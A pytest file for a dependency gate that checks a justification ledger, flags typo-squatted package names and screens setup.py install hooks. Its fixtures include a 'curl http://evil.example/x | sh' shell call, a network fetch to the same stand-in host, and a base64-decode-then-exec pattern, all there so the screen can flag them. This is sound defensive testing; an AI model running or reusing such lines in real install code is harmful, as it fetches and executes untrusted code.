"""Test twin for adapters/dependencies.py -- the dependency gate.

Acceptance: the real repo is clean (every declared dependency is justified). Refusal:
an unjustified dependency fails, an incomplete ledger row fails loud, a stale row warns,
and missing files fail loud. This test rides `make check`, so an unjustified dependency
cannot merge silently.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from adapters.dependencies import (
    POPULAR_PACKAGES,
    LedgerError,
    _canonical,
    _edit_distance,
    admission_concerns,
    audit_dependencies,
    install_hook_concerns,
    read_declared,
    read_ledger,
    render_dependencies,
    screen_source,
)

_GOOD_ROW = 'why = "w"\nstdlib_alternative = "s"\nremovable = "r"\n'


def _write(tmp_path: Path, pyproject: str, ledger: str) -> tuple[Path, Path]:
    p = tmp_path / "pyproject.toml"
    lg = tmp_path / "ledger.toml"
    p.write_text(pyproject, encoding="utf-8")
    lg.write_text(ledger, encoding="utf-8")
    return p, lg


# ----- acceptance: the shipped repo passes its own gate --------------------------------
def test_the_real_repo_has_no_unjustified_dependencies() -> None:
    audit = audit_dependencies()  # defaults to the repo's pyproject + ledger
    assert audit.passed, f"unjustified dependencies: {audit.unjustified}"
    assert not audit.stale, f"stale ledger rows: {audit.stale}"
    assert audit.ok, "expected at least one justified dependency"


def test_canonical_strips_extras_and_version_markers() -> None:
    assert _canonical("bandit[toml]>=1.7") == "bandit"
    assert _canonical("types-PyYAML") == "types-pyyaml"
    assert _canonical("pytest_cov") == "pytest-cov"


# ----- refusal: unjustified declaration fails the gate ---------------------------------
def test_an_unjustified_dependency_fails(tmp_path: Path) -> None:
    p, lg = _write(
        tmp_path,
        '[project]\ndependencies = ["pyyaml", "requests"]\n',
        f"[runtime.pyyaml]\n{_GOOD_ROW}",  # requests has no row
    )
    audit = audit_dependencies(p, lg)
    assert not audit.passed
    assert "requests" in audit.unjustified


def test_a_stale_ledger_row_warns_but_does_not_fail(tmp_path: Path) -> None:
    p, lg = _write(
        tmp_path,
        '[project]\ndependencies = ["pyyaml"]\n',
        f"[runtime.pyyaml]\n{_GOOD_ROW}\n[runtime.olddep]\n{_GOOD_ROW}",
    )
    audit = audit_dependencies(p, lg)
    assert audit.passed  # stale is a warning, not a failure
    assert "olddep" in audit.stale


def test_an_incomplete_ledger_row_fails_loud(tmp_path: Path) -> None:
    p, lg = _write(
        tmp_path,
        '[project]\ndependencies = ["pyyaml"]\n',
        '[runtime.pyyaml]\nwhy = "w"\n',  # missing stdlib_alternative + removable
    )
    with pytest.raises(LedgerError, match="missing required field"):
        audit_dependencies(p, lg)


def test_a_missing_pyproject_fails_loud(tmp_path: Path) -> None:
    with pytest.raises(LedgerError, match="pyproject not found"):
        read_declared(tmp_path / "nope.toml")


def test_a_missing_ledger_fails_loud(tmp_path: Path) -> None:
    with pytest.raises(LedgerError, match="ledger not found"):
        read_ledger(tmp_path / "nope.toml")


def test_dev_extras_are_counted_as_declared(tmp_path: Path) -> None:
    p, lg = _write(
        tmp_path,
        '[project]\ndependencies = []\n[project.optional-dependencies]\ndev = ["ruff"]\n',
        f"[dev.ruff]\n{_GOOD_ROW}",
    )
    declared = read_declared(p)
    assert "ruff" in declared.dev
    assert audit_dependencies(p, lg).passed


def test_render_shows_the_verdict() -> None:
    out = render_dependencies()
    assert "DEPENDENCY GATE" in out
    assert "PASS" in out  # the real repo is clean


# --- the offline admission screen (typo-squat / hallucination defense) --------------------------

_TRUSTED = frozenset({"pyyaml", "sqlalchemy", "fastapi"})


def test_a_typosquat_of_a_popular_package_is_flagged() -> None:
    # 'requsts' is one edit (a dropped 'e') from 'requests': neither that package nor trusted
    concerns = admission_concerns("requsts", trusted=_TRUSTED)
    assert concerns and "requests" in concerns[0] and "typo-squat" in concerns[0]


def test_a_near_miss_of_a_hyphenated_popular_package_is_flagged() -> None:
    # 'python-dateutils' is one edit (a trailing 's') from the real 'python-dateutil'
    concerns = admission_concerns("python-dateutils", trusted=_TRUSTED)
    assert concerns and "python-dateutil" in concerns[0]


def test_a_popular_package_itself_is_admissible() -> None:
    assert admission_concerns("requests", trusted=_TRUSTED) == []


def test_a_trusted_justified_package_is_admissible() -> None:
    # in our ledger already: justified by a human, so the screen stays quiet
    assert admission_concerns("sqlalchemy", trusted=_TRUSTED) == []


def test_a_novel_unrelated_name_is_admissible_no_false_positive() -> None:
    # far from any popular name: the screen must not cry wolf on legitimate new names
    assert admission_concerns("codeforge-nav", trusted=_TRUSTED) == []


def test_an_invalid_package_name_is_refused() -> None:
    # '@' is not stripped by _canonical and is not a legal PEP 503 name char, so it survives to fail
    concerns = admission_concerns("weird@name", trusted=_TRUSTED)
    assert concerns and "not a valid package name" in concerns[0]


def test_edit_distance_is_capped_and_correct() -> None:
    assert _edit_distance("requests", "requsts") == 1  # one deletion
    assert _edit_distance("requests", "requests") == 0
    assert (
        _edit_distance("requests", "reqeusts") == 2
    )  # an adjacent transposition is two in plain Levenshtein
    assert _edit_distance("abc", "xyzxyz", cap=2) == 3  # length gap beyond cap -> cap + 1


def test_screen_uses_the_real_ledger_and_clears_our_own_deps() -> None:
    from adapters.dependencies import screen_name

    # every real declared dep is justified (trusted), so none trips the screen
    assert screen_name("sqlalchemy") == []
    assert POPULAR_PACKAGES  # the curated set is non-empty


# --- behavioral admission screen: what the install-time code DOES (#25) --------------------------
_CLEAN_SETUP = """
from setuptools import setup, find_packages

setup(
    name="honest-lib",
    version="1.2.3",
    packages=find_packages(),
    install_requires=["requests"],  # a declared runtime dep is not an install-time import
)
"""


def test_a_clean_setup_py_has_no_install_concerns() -> None:
    # naming a dependency in install_requires is data, not an install-time import of the module
    assert install_hook_concerns(_CLEAN_SETUP) == []


def test_install_time_network_is_flagged() -> None:
    src = (
        "import urllib.request\n"
        "urllib.request.urlopen('http://evil.example/x')\n"
        "from setuptools import setup\nsetup(name='x')\n"
    )
    concerns = install_hook_concerns(src)
    assert any("network" in c for c in concerns)


def test_install_time_shell_execution_is_flagged() -> None:
    src = (
        "import os\n"
        "os.system('curl http://evil.example/x | sh')\n"
        "from setuptools import setup\nsetup(name='x')\n"
    )
    concerns = install_hook_concerns(src)
    assert any("process/shell" in c for c in concerns)


def test_subprocess_import_is_flagged_for_review() -> None:
    src = (
        "import subprocess\n"
        "subprocess.run(['git', 'describe'])\n"
        "from setuptools import setup\nsetup(name='x')\n"
    )
    # a benign git call still surfaces for human review (propose-only screen), not a silent pass
    assert any("process/shell" in c for c in install_hook_concerns(src))


def test_dynamic_exec_is_flagged() -> None:
    assert any("dynamic code execution" in c for c in install_hook_concerns("exec('print(1)')\n"))


def test_decode_then_exec_is_the_obfuscation_shape() -> None:
    src = "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"
    concerns = install_hook_concerns(src)
    assert any("dynamic code execution" in c for c in concerns)
    assert any("obfuscated payload" in c for c in concerns)  # decode + exec together


def test_decode_without_exec_is_not_the_obfuscation_shape() -> None:
    # base64 alone (no eval/exec) is not the hidden-install-hook pattern -> no false positive
    concerns = install_hook_concerns("import base64\nx = base64.b64encode(b'data')\n")
    assert not any("obfuscated" in c or "dynamic code" in c for c in concerns)


def test_an_unparseable_setup_is_treated_as_suspicious() -> None:
    concerns = install_hook_concerns("this is not python !!!(\n")
    assert len(concerns) == 1 and "does not parse" in concerns[0]


def test_screen_source_reads_a_file(tmp_path: Path) -> None:
    p = tmp_path / "setup.py"
    p.write_text("import socket\nsocket.socket()\n", encoding="utf-8")
    assert any("network" in c for c in screen_source(p))


def test_screen_source_finds_setup_py_in_a_directory(tmp_path: Path) -> None:
    (tmp_path / "setup.py").write_text(_CLEAN_SETUP, encoding="utf-8")
    assert screen_source(tmp_path) == []


def test_screen_source_missing_file_is_loud(tmp_path: Path) -> None:
    with pytest.raises(OSError):  # noqa: PT011, RUF100
        screen_source(tmp_path / "nope.py")
